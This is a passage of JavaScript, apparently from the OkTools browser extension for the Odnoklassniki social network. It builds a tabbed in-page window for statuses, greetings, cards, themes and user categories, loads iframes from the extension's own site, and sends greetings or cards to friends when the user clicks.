				create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/smiles.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}
			if (mod=="pozd_fast")
			{		
				window_content.setAttribute('style','padding:0px !important;');
				create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/pozd_fast.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}
			else if (mod=="moder")
			{				
				clear_html(doc.getElementById("ok_window_cat"));
				window_content.setAttribute('class', 'ok_window_con_tab');	
				visible_diva('ok_window_block_cat', 'none', '');
				create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/moder.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}
			else if (mod=="help")
			{				
				clear_html(doc.getElementById("ok_window_cat"));
				window_content.setAttribute('class', 'ok_window_con_tab');	
				visible_diva('ok_window_block_cat', 'none', '');
				create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/faq/?ok_uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}
			else if (mod=="myprofile")
			{		
				clear_html(doc.getElementById("ok_window_cat"));
				window_content.setAttribute('class', 'ok_window_con_tab');		
				visible_diva('ok_window_block_cat', 'none', '');
				var t=create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//oktools.ru/page/user_profile.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}
			else if (mod=="card")
			{		
				window_content.setAttribute('style','padding:0px !important;');
				create_dom('iframe', window_content, '', {"width":"100%","height":"100%","frameborder":"0","src":"//theme.oktools.ru/add_card.php?uid="+user[0].uid+"&hash="+user[0].hash+"&browser="+user[0].browser+"&version="+user[0].version+"", "id":"ok_window_content_table"}, '');
				reload_size(true, true);
			}			
		}
	}
}

function ok_window()
{			
	var tab_status = doc.getElementById('tab_status') || null;
	if (tab_status)
	{
		if (!tab_status.hasAttribute('load'))
		{
			tab_status.setAttribute('load', true);
			tab_status.addEventListener('click', function() {window_load('', '', '', '0', 'rand'); }, true);
		}				
	}
	var tab_links=doc.getElementById('hook_Block_BodySwitcher') || null;
	if (tab_links)
	{     	
		if (!tab_links.hasAttribute('load'))
		{
			tab_links.setAttribute('load', true);					
			var client_height=getClientHeight()-100;
			if (client_height<300) {client_height=300;}	
			if (client_height>800) {client_height=800;}
			var BPclass='';
			var BPmail=doc.getElementById('hook_Block_PMailRu') || null;
			if (!BPmail)
			{ 
				BPclass='no_mail_toolbar';
			}	
			
			var div_window = create_dom('div', tab_links, '', {"class":"topPanel topPanel_ek "+BPclass+"","id":"ok_window","mod":"status","cat_id":"0","cat_f":"0","page":"0","search":""}, '');
				div_window.addEventListener('click', function(e) {
				var target=e.target;
				if (target.hasAttribute('id'))
				{
					if (target.id=="ok_window")
					{						
						req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};
						target.setAttribute("style", "display:none");
					}
				}
			});
				var ok_window_block=create_dom('div', div_window , '', {"id":"ok_window_block", "style":"height:"+client_height+"px;"}, '');
						var table=create_dom('table', ok_window_block, '', {"class":"ok_window_block_table", "cellpadding":"0", "cellspacing":"0"}, '');
							var tr=create_dom('tr', table, '', {}, '');
								var td=create_dom('td', tr, '', {"id":"ok_window_mod","colspan":"2"}, '');
									td.addEventListener('click', function(e) {
										var mod=e.target.getAttribute('mod');
										if ((mod!=null) && (mod!=""))
										{
											if ((mod=='moder') || (mod=='myprofile'))
											{												
												status_add_div(mod, '', '');
											}					
											else
											{													
												window_load(mod, '', '', '0', '');	
											}
										}
									}, true);
									var div=create_dom('div', td, '', {"style":"float:left;"}, '');
										create_dom('h1', div, '', {"id":"ok_window_mod_status","class":"ok_button btn_orange btn_h2_hov", "mod":"status"}, language_text("ok_status"));
										create_dom('h1', div, '', {"id":"ok_window_mod_pozd","class":"ok_button btn_orange btn_h2", "mod":"pozd"}, language_text("ok_pozd"));
										create_dom('h1', div, '', {"id":"ok_window_mod_card","class":"ok_button btn_orange btn_h2", "mod":"card"}, language_text("ok_card"));										
										create_dom('h1', div, '', {"id":"ok_window_mod_theme","class":"ok_button btn_orange btn_h2", "mod":"theme"}, language_text("ok_theme"));
										create_dom('h1', div, '', {"id":"ok_window_mod_option","class":"ok_button btn_orange btn_h2", "mod":"option"}, language_text("ok_option_span"));
										create_dom('h1', div, '', {"id":"ok_window_mod_moder","class":"ok_button btn_orange btn_h2", "mod":"moder"}, language_text("ok_moder"));
										var h1=create_dom('h1', div, '', {"id":"ok_window_mod_myprofile","class":"ok_button btn_orange btn_h2", "mod":"myprofile"}, language_text("ok_profile_main"));
											create_dom('div', h1, '', {"id":"ok_notification_user","class":"ok_notification_user"}, language_text("ok_profile_user"));
									var ok_close=create_dom('a', td, '', {"id":"ok_window_close", "class":"ok_oktools_icons", "title":""+language_text("ok_pozd_add_close")+""}, '');
									ok_close.addEventListener('click', function() {visible_div('ok_window');req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};}, true);	
									var ok_help=create_dom('a', td, '', {"id":"ok_window_help", "class":"ok_oktools_icons", "title":""+language_text("ok_option_help")+""}, '');
									ok_help.addEventListener('click', function() {status_add_div('help', '', '');}, true);
									var ok_config=create_dom('a', td, '', {"id":"ok_window_config", "class":"ok_oktools_icons", "title":""+language_text("ok_option")+""}, '');
									ok_config.addEventListener('click', function() {sendRequest({action: 'config'}, function(data) { });}, true);	
									var div1=create_dom('div', td, '', {"class":"ok_window_search"}, '');
										create_dom('input', div1, '', {"type":"text","id":"ok_window_search_text","value":""}, '');
										var search_button=create_dom('input', div1, '', {"type":"submit","class":"ok_button btn_green","id":"ok_window_search_button","value":""+language_text("ok_search_button")+""}, '');
											search_button.addEventListener('click', function() {
												var search_text=doc.getElementById("ok_window_search_text").value;
												if ((search_text!=null) && (search_text!=""))
												{
													var window_block=doc.getElementById("ok_window") || null;
													if (window_block)
													{								
														window_block.setAttribute('search',search_text);
														window_load('', '','', '0', '');
													}
												}
											}, true);
									create_dom('div', td, '', {"style":"clear:both;"}, '');
							var tr1=create_dom('tr', table, '', {}, '');
								var td1=create_dom('td', tr1, '', {"id":"ok_window_block_cat"}, '');
									var window_cat=create_dom('div', td1, '', {"id":"ok_window_cat"}, language_text("ok_load_cat"));
										window_cat.addEventListener('click', function(e) {
											var cat_id=e.target.getAttribute('cat_id');
											var class_el=e.target.getAttribute('class');				
											if (class_el=="ok_cat_user_del")
											{
												var wblock=doc.getElementById("ok_window") || null;
												if (wblock)
												{
													var mod=wblock.getAttribute('mod');
													sendRequest({action: 'cat_delete', mod: mod, cat_id:cat_id, user: user}, function(data) { 	
														if (data.result)
														{
															var elc=doc.getElementById("ok_click_event-uc"+cat_id) || null;
															if (elc)
															{
																elc.parentNode.removeChild(elc);
															}	
															var elu=doc.getElementById("ok_cat_user_izbr_"+cat_id) || null;
															if (elu)
															{
																elu.parentNode.removeChild(elu);
															}
															alert(language_text("ok_cat_del_ok"));				
														}
														else
														{
															alert(data.error);
														}
													});						
												}												
											}
											else if ((cat_id!=null) && (cat_id!=""))
											{
												var window_block=doc.getElementById("ok_window") || null;
												if (window_block)
												{
													window_block.setAttribute('cat_id',cat_id);
													window_block.setAttribute('search','');
													window_block.setAttribute('page','0');
													var cat_prev=window_block.querySelector('.ok_window_cat_event.check');
													if (cat_prev)
													{
														cat_prev.classList.remove('check');
													}
													var cat_check=window_block.querySelector('.ok_window_cat_event[cat_id="'+cat_id+'"]');
													if (cat_check)
													{
														cat_check.classList.add('check');
													}
												}	
												window_load('', '', '', '0', '');					
											}
										}, true);
								var td2=create_dom('td', tr1, '', {"class":"ok_window_block_content"}, '');
									var div2=create_dom('div', td2, '', {"id":"ok_window_content_load"}, '');
										create_dom('div', div2, '', {"class":"ok_window_content_load_m"}, '');										
									var div3=create_dom('div', td2, '', {"id":"ok_window_content_menu"}, '');	
										create_dom('div', div3, '', {"id":"ok_window_content_menu_0", "cat_f":"0", "class":"ok_button btn_orange btn_hov"}, language_text("ok_new"));
										create_dom('div', div3, '', {"id":"ok_window_content_menu_1", "cat_f":"1", "class":"ok_button btn_orange"}, language_text("ok_rating"));
										create_dom('div', div3, '', {"id":"ok_window_content_menu_2", "cat_f":"2", "class":"ok_button btn_orange"}, language_text("ok_loader"));
										create_dom('div', div3, '', {"id":"ok_window_content_menu_10", "cat_f":"10", "class":"ok_button btn_red","style":"display:none"}, language_text("ok_pozd_platn"));
										div3.addEventListener('click', function(e) {
											var cat_f=e.target.getAttribute('cat_f');
											if ((cat_f!=null) && (cat_f!=""))
											{
												var window_block=doc.getElementById("ok_window") || null;
												if (window_block)
												{
													window_block.setAttribute('cat_f',cat_f);
													window_block.setAttribute('page','0');
												}
												if (cat_f==10)
												{
													doc.getElementById("ok_window_content_menu_"+previous_cat_f).setAttribute('class','ok_button btn_orange');
													doc.getElementById("ok_window_content_menu_"+cat_f).setAttribute('class','ok_button btn_red btn_hov_red');			
												}
												else
												{
													if (previous_cat_f==10)
													{
														doc.getElementById("ok_window_content_menu_"+previous_cat_f).setAttribute('class','ok_button btn_red');
													}
													else
													{
														doc.getElementById("ok_window_content_menu_"+previous_cat_f).setAttribute('class','ok_button btn_orange');
													}
													doc.getElementById("ok_window_content_menu_"+cat_f).setAttribute('class','ok_button btn_orange btn_hov');
												}
												previous_cat_f=cat_f;
												window_load('', '', '', '0', '');					
											}
										}, true);
									create_dom('hr', td2, '', {"id":"ok_window_content_hr", "noshade":"", "style":"margin-bottom:3px;width:96%,font-color:#CCCCCC;", "size":"2"}, '');
									var wind_cont=create_dom('div', td2, '', {"id":"ok_window_content"}, '');
										create_dom('div', wind_cont, '', {"id":"ok_cat_user_izbr"}, '');
									var content_page=create_dom('div', td2, '', {"id":"ok_window_content_page"}, '');
										content_page.addEventListener('click', function(e) {				
											var page=e.target.getAttribute('page');
											if ((page!=null) && (page!=""))
											{
												var window_block=doc.getElementById("ok_window") || null;
												if (window_block)
												{
													window_block.setAttribute('page',page);
												}				
												window_load('', '', '', '0', '');								
											}
										}, true);
							var tr2=create_dom('tr', table, '', {}, '');
								var td3=create_dom('td', tr2, '', {"style":"padding:3px", "colspan":"2"}, '');
									var div4=create_dom('div', td3, '', {"class":"ok_oktools_plugin"}, language_text("ok_plugin"));
										create_dom('b', div4, '', {}, version);
										create_dom('span', div4, '', {"id":"ok_oktools_update"}, '');
									var div5=create_dom('div', td3, '', {"class":"ok_oktools_support"}, '');
										create_dom('a', div5, '', {"target":"_blank", "href":""+ext_url+""}, language_text("ok_plugin_otziv"));
										create_dom('a', div5, '', {"target":"_blank", "href":"http://oktools.ru/"}, language_text("ok_plugin_site"));
										create_dom('a', div5, '', {"target":"_blank", "href":"http://oktools.ru/forum/"}, language_text("ok_plugin_support_link"));		
															
			wind_cont.addEventListener('click', function(e) {
				var click_element=e.target.getAttribute('class');			
				if (click_element=="ok_button_left btn_green")
				{
					var window_block=doc.getElementById("ok_window") || null;
					if (window_block)
					{								
						var mod_butt=window_block.getAttribute('mod');	
						if (mod_butt=="status")
						{
							var status_text=e.target.getAttribute('value');
							if ((status_text!=null) && (status_text!=""))
							{
								var mat_id=e.target.getAttribute('mat_id');
								content_rating(mod_butt,mat_id,'3');
								set_status(status_text);
							}
						}
						if (mod_butt=="pozd")
						{							
							var button=e.target;
							var mat_id=button.getAttribute('mat_id');
							if ((mat_id!=null) && (mat_id!=""))
							{	
								var pozd_div=doc.getElementById('ok_pozd_text_'+mat_id) || null;
								if (pozd_div)
								{		
								
									var par_img=pozd_div.parentNode;
									var loading_div=create_dom('div', par_img, '', {"class":"oktools_card_load"}, '');
										var load_d=create_dom('div', loading_div, '', {"class":"oktools_cssload_cont"}, '');	
											create_dom('div', load_d, '', {"class":"oktools_cssload"}, '');
									var pozd_text=pozd_div.innerHTML;	
									button.textContent="Отправка ...";
									
									sendRequest({action: 'load_option', param: 'OkPozdCop'}, function(result) { 
										if (result)
										{
											pozd_text=''+pozd_text+' '+text_mess+'';																						
										}		
										content_rating(mod_butt,mat_id,'3');
										if ((req_post.type=="dialog") || (req_post.type=="message"))
										{
											send_message(''+req_post.type+'', ''+req_post.action+'', ''+req_post.data+'', ''+req_post.muid+'', ''+pozd_text+'', '', function(result)
											{
												if (result)
												{				
													loading_div.firstChild.classList.add("ok");
													button.textContent="Отправлено";
												}
												else
												{
													loading_div.firstChild.classList.add("nok");
													button.textContent="НЕ Отправлено";													
												}
											});
										}										
										else 
										{		
											request_get_friends('1', 'message', mat_id, ''+pozd_text+'');
										}
									});									
								}
								//visible_div('ok_window');	
							}
						}
						if (mod_butt=="card")
						{						
							var button=e.target;					
							var mat_id=button.getAttribute('mat_id');							
							if ((mat_id!=null) && (mat_id!=""))
							{	
								var card_img=doc.getElementById('ok_card_img_'+mat_id) || null;
								if (card_img)
								{		
									var par_img=card_img.parentNode;
									var loading_div=create_dom('div', par_img, '', {"class":"oktools_card_load"}, '');
										var load_d=create_dom('div', loading_div, '', {"class":"oktools_cssload_cont"}, '');	
											create_dom('div', load_d, '', {"class":"oktools_cssload"}, '');
									if (card_img.hasAttribute('src'))
									{																					
										var img=card_img.getAttribute('src');																		
										var img=img.replace(/https/g, "http");										
										if ((req_post.type=="dialog") || (req_post.type=="message"))
										{				
											button.textContent="Отправка ...";
											load_img(''+req_post.muid+'', ''+img+'', function(data){																		
												send_message(''+req_post.type+'', ''+req_post.action+'', '', data.uid, '', data.attach, function(result){
													if (result)
													{
														loading_div.firstChild.classList.add("ok");
														button.textContent="Отправлено";
													}
													else
													{
														loading_div.firstChild.classList.add("nok");
														button.textContent="НЕ Отправлено";
													}										
												});
											});
										}										
										else if (req_post.type=="")
										{
											request_get_friends('1', 'card', mat_id, img);																	
											content_rating(mod_butt,mat_id,'3');
										}
									}																				
								}
								//visible_div('ok_window');	
							}
						}
						if (mod_butt=="theme")
						{							
							var mat_id=e.target.getAttribute('mat_id');
							if ((mat_id!=null) && (mat_id!=""))
							{
								sendRequest({action: 'get_theme', id: mat_id, guid:'0', user:user}, function(data) {get_theme(data);});
							}							
						}						
					}					
				}				
				else if ((click_element=="ok_oktools_icons ok_window_rating_like") || (click_element=="ok_oktools_icons ok_window_rating_dislike"))
				{
					var window_block=doc.getElementById("ok_window") || null;
					if (window_block)
					{			
						var mod_butt=window_block.getAttribute('mod');
						var mat_id=e.target.getAttribute('mat_id');
						if ((mat_id!=null) && (mat_id!=""))
						{
							if (click_element=="ok_oktools_icons ok_window_rating_like") { var rating=1; }
							if (click_element=="ok_oktools_icons ok_window_rating_dislike") { var rating=0; }
							content_rating(mod_butt,mat_id,rating);
						}
					}					
				}
				else if(/ok_option_save/gi.test(click_element))
				{		
					var mat_id=e.target.getAttribute('mat_id');
					if ((mat_id!=null) && (mat_id!=""))
					{
						for (var key in option) 
						{
							if (mat_id==option[key][0].id)
							{																
								option_save(mat_id);
							}
						}
					}					
				}
				else if(click_element=="ok_button_right btn_red")
				{					
					var ok_cat_user_izbr=doc.getElementById("ok_cat_user_izbr") || null;
					if (ok_cat_user_izbr)
					{
						var mat_id=e.target.getAttribute('mat_id');
						ok_cat_user_izbr.setAttribute('mat_id', ''+mat_id+'');
						var ok_wi_con=doc.getElementById("ok_window_content") || null;
						if (ok_wi_con)
						{
							var pos_ok_win=posit(ok_wi_con);
							var position=posit(e.target);
							var left=(position.y-pos_ok_win.y)-190;
							var top=(position.x-pos_ok_win.x);							
							ok_cat_user_izbr.setAttribute('style', 'display:block;left:'+left+'px;top:'+top+'px;');
						}
					}
				}
				else if (click_element=="ok_cat_user_izbr_d")
				{
					var ok_cat_user_izbr=doc.getElementById("ok_cat_user_izbr") || null;
					if (ok_cat_user_izbr)
					{
						var mod=ok_cat_user_izbr.getAttribute('mod');
						var mat_id=ok_cat_user_izbr.getAttribute('mat_id');
						var cat_id=e.target.getAttribute('cat_id');						
						if ((cat_id!=null) && (cat_id!=""))
						{
							sendRequest({action: 'izbr_add', mod: mod, mat_id:mat_id, cat_id:cat_id, user: user}, function(data) { 	
								if (data.result)
								{ 
									var count=doc.getElementById("ok_cat_user_count_"+data.cat_id+"") || null;
									if (count)
									{
										count.textContent=data.cat_count;
									}
									var day=doc.getElementById("ok_cat_user_day_"+data.cat_id+"") || null;
									if (day)
									{
										
										day.textContent="+"+data.cat_day;
									}
									else
									{
										var li=doc.getElementById("ok_click_event-uc"+data.cat_id+"") || null;
										if (li)
										{
											create_dom('span', li, '', {"id":"ok_cat_user_day_"+data.cat_id+"","class":"ok_window_cat_event_li_del","cat_id":""+data.cat_id+""}, "+"+data.cat_day);
										}
									}
									ok_cat_user_izbr.setAttribute('style','display:none');
									var okb=doc.getElementsByClassName('ok_button_right btn_red') || null;
									if (okb)
									{  		
										for (var ok=0;ok<okb.length;ok++)
										{
											if(okb[ok].getAttribute('mat_id')==data.mat_id)
											{
												okb[ok].textContent="–";
												okb[ok].setAttribute('class','ok_button_right btn_orange');	
												ok=okb.length;
											}											
										}
									}		
								}
								else
								{
									alert(data.error);
								}
							});	
						}
					}
					
				}
				else if(click_element=="ok_button_right btn_orange")
				{ 
					var ok_cat_user_izbr=doc.getElementById("ok_cat_user_izbr") || null;
					if (ok_cat_user_izbr)
					{
						var mod=ok_cat_user_izbr.getAttribute('mod');
						var mat_id=e.target.getAttribute('mat_id');
						if ((mat_id!=null) && (mat_id!=""))
						{
							
							sendRequest({action: 'izbr_del', mod: mod, mat_id:mat_id, user: user}, function(data) { 	
								if (data.result)
								{ 
									e.target.textContent="+";
									e.target.setAttribute('class','ok_button_right btn_red');
									var count=doc.getElementById("ok_cat_user_count_"+data.cat_id+"") || null;
									if (count)
									{
										count.textContent=data.cat_count;
									}
									var day=doc.getElementById("ok_cat_user_day_"+data.cat_id+"") || null;
									if (day)
									{
										
										day.textContent="+"+data.cat_day;
									}									
								}
								else
								{
									alert(data.error);
								}
							});		
						}
					}
				}
				else if(click_element=="ok_window_img")
				{
					var tid=e.target.getAttribute('tid');	
					var cat_id=e.target.getAttribute('cat_id');				
					var cat_f=e.target.getAttribute('cat_f');
					theme_view(tid, cat_id, cat_f);			
				}
			}, true);			
			doc.getElementById("ok_window_content_page").setAttribute('style','display:none');
			doc.getElementById("ok_window_content_menu").setAttribute('style','display:none');
			doc.getElementById("ok_window_content_hr").setAttribute('style','display:none');	
			reload_size(true, false);
		}	
	}
}
function window_load_listener(mod)
{
	var window_add=doc.getElementById("ok_window_add") || null;
	if (window_add)
	{
		window_add.addEventListener('click', function(e) { status_add_div(mod, '', ''); }, true);					
	}	
	var window_pozd_smiles=doc.getElementById("ok_window_pozd_smiles") || null;
	if (window_pozd_smiles)
	{
		window_pozd_smiles.addEventListener('click', function(e) { status_add_div('smiles', '', ''); }, true);					
	}
	var window_pozd_fast=doc.getElementById("ok_window_pozd_fast") || null;
	if (window_pozd_fast)
	{
		window_pozd_fast.addEventListener('click', function(e) { status_add_div('pozd_fast', '', ''); }, true);					
	}
}
function content_error(el, error) 
{
	clear_html(el);
	var div=create_dom('div',el, '', {"class":"ok_content_error","id":"ok_window_content_table"}, '');	
		create_dom('div', div, '', {"class":"ok_content_error_title"}, error.title);
		var desc=create_dom('div', div, '', {"class":"ok_content_error_desc"}, '');
			var desc1=create_dom('div', desc, '', {}, '');
			create_dom('div', desc, '', {"style":"color:red; font-weight:bold;margin-bottom:8px;margin-top:8px;"}, error.title);
			var ul=create_dom('ul', desc, '', {"style":"list-style-type:circle;margin-left:20px;"}, '');
	if(error.cat!="")
	{	
		create_dom('div', desc1, '', {}, language_text("ok_content_err_incat")+' '+error.cat+'');
		create_dom('li', ul, '', {}, error.cat_act);
	}
	if(error.search!="")
	{
		create_dom('div', desc1, '', {}, language_text("ok_content_err_zapros")+' '+error.search+'');
		create_dom('li', ul, '', {}, error.search_act);
	}
	if(error.sort!="")
	{
		create_dom('div', desc1, '', {}, language_text("ok_content_err_sort")+' '+error.sort+'');
		create_dom('li', ul, '', {}, error.sort_act);
	}
	if(error.desc!="")
	{
		create_dom('div', desc1, '', {"style":"font-weight:bold;margin-top:8px;"}, error.desc);
	}
}
function content_rat(id, rating, load, tr, author, author_uid, author_rat, width)
{
	var td=create_dom('td', tr, '', {"id":"rating_"+id+"", "style":"width:"+width+"px;"}, '');		
		if((author!="") || (author_rat!=""))
		{
			var table=create_dom('table', td, '', {"style":"width:"+width+"px;margin-bottom:20px;"}, '');
				var tr=create_dom('tr', table, '', {}, '');
					var td0=create_dom('td', tr, '', {}, language_text("ok_pozd_add_user")+" ");
						create_dom('a', td0, '', {"href":"//oktools.ru/user/"+author_uid+"","style":"font-weight:bold", "target":"_blank"}, author);
				var tr0=create_dom('tr', table, '', {}, '');
					var td1=create_dom('td', tr0, '', {}, language_text("ok_rating1")+" ");
						create_dom('b', td1, '', {}, author_rat);
		}
		var table1=create_dom('table', td, '', {}, '');
			var tr1=create_dom('tr', table1, '', {}, '');
				create_dom('td', tr1, '', {"class":"ok_oktools_icons ok_window_rating_dislike", "mat_id":""+id+""}, '');
				create_dom('td', tr1, '', {"id":"ok_window_rating_result_"+id+"", "class":"ok_window_rating_result"}, rating);
				create_dom('td', tr1, '', {"class":"ok_oktools_icons ok_window_rating_like", "mat_id":""+id+""}, '');
				var td4=create_dom('td', tr1, '', {"rowspan":"2", "style":"padding-left:12px;"}, '');		
			var tr2=create_dom('tr', table1, '', {}, '');
				var td3=create_dom('td', tr2, '', {"colspan":"3", "id":"ok_window_load_result_"+id+"", "style":"font-size:8px;text-align:center;border-top: 1px dotted #999999;padding-top:3px;font-weight:bold;"}, load);									
	return td4;
}
function cat_actual(el, cat, date)
{
	var actual=create_dom('div', el, '', {"style":"display:none"}, '');	
		create_dom('div', actual, '', {"style":"font-weight:bold;color:green;text-align:center;margin-bottom:1px;"}, language_text("ok_pozd_cat_actual"));	
	var ul_actual=create_dom('ul', actual, '', {}, '');
	for(var i = 0; i < cat.length; i++) 
	{  												
		if (cat[i].date==date)
		{
			var li=create_dom('li', ul_actual, '', {"id":"ok_click_event-"+cat[i].id+"", "class":"ok_window_cat_event", "cat_id":""+cat[i].id+""}, cat[i].title);	
				create_dom('b',li, '', {"cat_id":""+cat[i].id+"", "style":"margin-left:6px;"}, cat[i].count);	
			if (cat[i].count_day!=0)
			{
				create_dom('span', li, '', {"cat_id":""+cat[i].id+"","class":"ok_window_cat_event_li"}, "+"+cat[i].count_day);
			}
			actual.setAttribute('style','display:block;background-color:rgb(217, 237, 247);padding:2px;margin-bottom:2px;');
		}
	}
}
function add_cat_user(ul, mod)
{
	var li0=create_dom('li', ul, '', {"style":"margin-bottom:6px;"},'');	
		var div0=create_dom('div', li0, '', {"class":"ok_button btn_red","style":"display:inline;margin-left:3px;padding:2px;","title":""+language_text('ok_cat_add')+""}, language_text("ok_cat_add"));								
		var div01=create_dom('div', li0, '', {"class":"ok_add_cat_div"}, '');
			var cat_add=create_dom('input', div01, '', {"type":"text","style":"width:120px;"}, '');	
			var div_add=create_dom('div', div01, '', {"class":"ok_button btn_green","style":"display:inline;margin-left:5px;","title":""+language_text('ok_cat_add')+""}, language_text("ok_status_add_button"));
				div_add.addEventListener('click', function(e) { 
					var cat_name=cat_add.value;										
					sendRequest({action: 'cat_add', mod: mod, cat_name:cat_name, user: user}, function(data) { 	
						if (data.result)
						{ 
							if (data.cat_id!=0)
							{			
								cat_add.value='';
								div01.setAttribute('style', 'display:none;');
								var ok_ad_cat_us=doc.getElementById("ok_ad_cat_us") || null;
								if (ok_ad_cat_us)
								{
									var li=create_dom('li', ok_ad_cat_us, '', {"id":"ok_click_event-uc"+data.cat_id+"", "class":"ok_window_cat_event", "cat_id":"uc"+data.cat_id+""}, data.cat_name);	
										create_dom('b', li, '', {"id":"ok_cat_user_count_"+data.cat_id+"", "cat_id":"uc"+data.cat_id+"", "style":"margin-left:6px;"}, data.cat_count);	
										create_dom('span', li, '', {"class":"ok_cat_user_del","cat_id":""+data.cat_id+"","title":""+language_text('ok_cat_del')+""}, "X");								
								}
								var ok_cat_user_izbr=doc.getElementById("ok_cat_user_izbr") || null;
								if (ok_cat_user_izbr)
								{
									create_dom('div', ok_cat_user_izbr, '', {"id":"ok_cat_user_izbr_"+data.cat_id+"","cat_id":""+data.cat_id+"", "class":"ok_cat_user_izbr_d"}, data.cat_name);
								}
							}												
						}
						else
						{
							alert(data.error);
						}											
					});						
				}, true);									
			div0.addEventListener('click', function(e) { visible_div(div01);}, true);
}
function posit(el) 
{		
	var top=0;
	var left=0;
	var height=el.offsetHeight;
	var width=el.offsetWidth;
	while(el.offsetParent) 
	{				
		top += el.offsetTop;
		left += el.offsetLeft;
		el = el.offsetParent;
	}		
	return {"x":""+top+"","y":""+left+"","height":""+height+"","width":""+width+""};
}
function cat_all(ul_user, el, cat, mod, all_count, all_count_day)
{
	data_cat=cat;
	var cat_count=0;
	var cat_count_day=0;
	var ok_cat_user_izbr=doc.getElementById("ok_cat_user_izbr") || null;
	if (ok_cat_user_izbr)
	{
		clear_html(ok_cat_user_izbr);
		ok_cat_user_izbr.setAttribute('mod', ''+mod+'');
			create_dom('h2', ok_cat_user_izbr, '', {"style":"float:left;"}, language_text("ok_izbr"));
			var izbr_close=create_dom('span', ok_cat_user_izbr, '', {"style":"float:right;","class":"ok_user_izbr_close"}, "X");
				izbr_close.addEventListener('click', function(e) { 
					ok_cat_user_izbr.setAttribute('style','display:none');
				}, true);
		var ul=create_dom('ul', ok_cat_user_izbr, '', {}, '');
			add_cat_user(ul, mod);
	}
	for(var i = 0; i < cat.length; i++) 
	{  		
		if(cat[i].cat_user)
		{
			var li=create_dom('li', ul_user, '', {"id":"ok_click_event-uc"+cat[i].id+"", "class":"ok_window_cat_event", "cat_id":"uc"+cat[i].id+""}, cat[i].title);	
				create_dom('b', li, '', {"id":"ok_cat_user_count_"+cat[i].id+"","cat_id":"uc"+cat[i].id+"", "style":"margin-left:6px;"}, cat[i].count);
				if (cat[i].count_day!=0)
				{
					create_dom('span', li, '', {"id":"ok_cat_user_day_"+cat[i].id+"","class":"ok_window_cat_event_li_del","cat_id":""+cat[i].id+""}, "+"+cat[i].count_day);
				}
				create_dom('span', li, '', {"class":"ok_cat_user_del","cat_id":""+cat[i].id+"","title":""+language_text('ok_cat_del')+""}, "X");
			if (ok_cat_user_izbr)
			{	
				create_dom('div', ok_cat_user_izbr, '', {"id":"ok_cat_user_izbr_"+cat[i].id+"","cat_id":""+cat[i].id+"", "class":"ok_cat_user_izbr_d"}, cat[i].title);
			}
		}
		else
		{		
			cat_count=cat_count+parseInt(cat[i].count);
			cat_count_day=cat_count_day+parseInt(cat[i].count_day);
			if (cat[i].pid==0)
			{
				var li=create_dom('li', el, '', {"class":"ok_window_cat_event", "cat_id":""+cat[i].id+""}, cat[i].title);	
					create_dom('b', li, '', {"cat_id":""+cat[i].id+"", "style":"margin-left:6px;"}, cat[i].count);
					if (cat[i].count_day!=0)
					{
						create_dom('span', li, '', {"cat_id":""+cat[i].id+"","class":"ok_window_cat_event_li"}, "+"+cat[i].count_day);
					}
				for(var p = 0; p < cat.length; p++) 
				{								
					if (cat[i].id==cat[p].pid)
					{
						var ul=create_dom('ul', li, '', {}, '');	
							var li1=create_dom('li', ul, '', {"class":"ok_window_cat_event","cat_id":""+cat[p].id+""}, cat[p].title);	
								create_dom('b', li1, '', {"cat_id":""+cat[p].id+"", "style":"margin-left:6px;"}, cat[p].count);
								if (cat[p].count_day!=0)
								{
									create_dom('span', li1, '', {"cat_id":""+cat[p].id+"","class":"ok_window_cat_event_li"}, "+"+cat[p].count_day);
								}
					}
				}
			}
		}
	}
	if (all_count!="")
	{
		all_count.textContent=cat_count;
	}
	if(all_count_day!="")
	{
		all_count_day.textContent="+"+cat_count_day;
	}
}
function body_oh(vis)
{
	/*
	var htm=doc.getElementsByTagName('body')[0];
	if(vis)
	{	
		if (!htm.classList.contains('oh'))
		{
			htm.classList.add('oh');
		}
	}
	else
	{
		htm.classList.remove('oh');
	}*/
}
function window_load(mod, podmod, text, send, vis)
{		
	var load_window=true;
	var window_block=doc.getElementById("ok_window") || null;
	if (window_block)
	{			
		if (vis=="rand")
		{
			if (window_block.style.display=="none" || window_block.style.display=="") 
			{
				body_oh(true);
				window_block.setAttribute('style','display:block;');
			} 
			else 
			{		  
				body_oh(false);
				window_block.setAttribute('style','display:none');
			} 
		}
		else if (vis=="block")
		{
			body_oh(true);
			window_block.setAttribute('style','display:block');
		}
		else if (vis=="none")
		{
			body_oh(false);
			window_block.setAttribute('style','display:none');
		}
		
		reload_param(window_block, mod);
		var date_obj = new Date();
		var day = date_obj.getDate();
		var month = date_obj.getMonth() + 1;
		var date=day+'.'+month;
		var mod=window_block.getAttribute('mod');
		if((mod!='pozd') && (mod!='card'))
		{
			//console.log('clear_WIN|NOT_POZD');
			req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};			
		}
		if(send=='1')
		{
			//console.log('clear_WIN|1');
			req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};
		}			
		
		//console.log('WINDOW_LOAD|'+mod+'|'+req_post.type+'|'+req_post.action+'|'+req_post.data+'|'+req_post.muid+'|'+req_post.com_id+'|'+req_post.com_name);
		
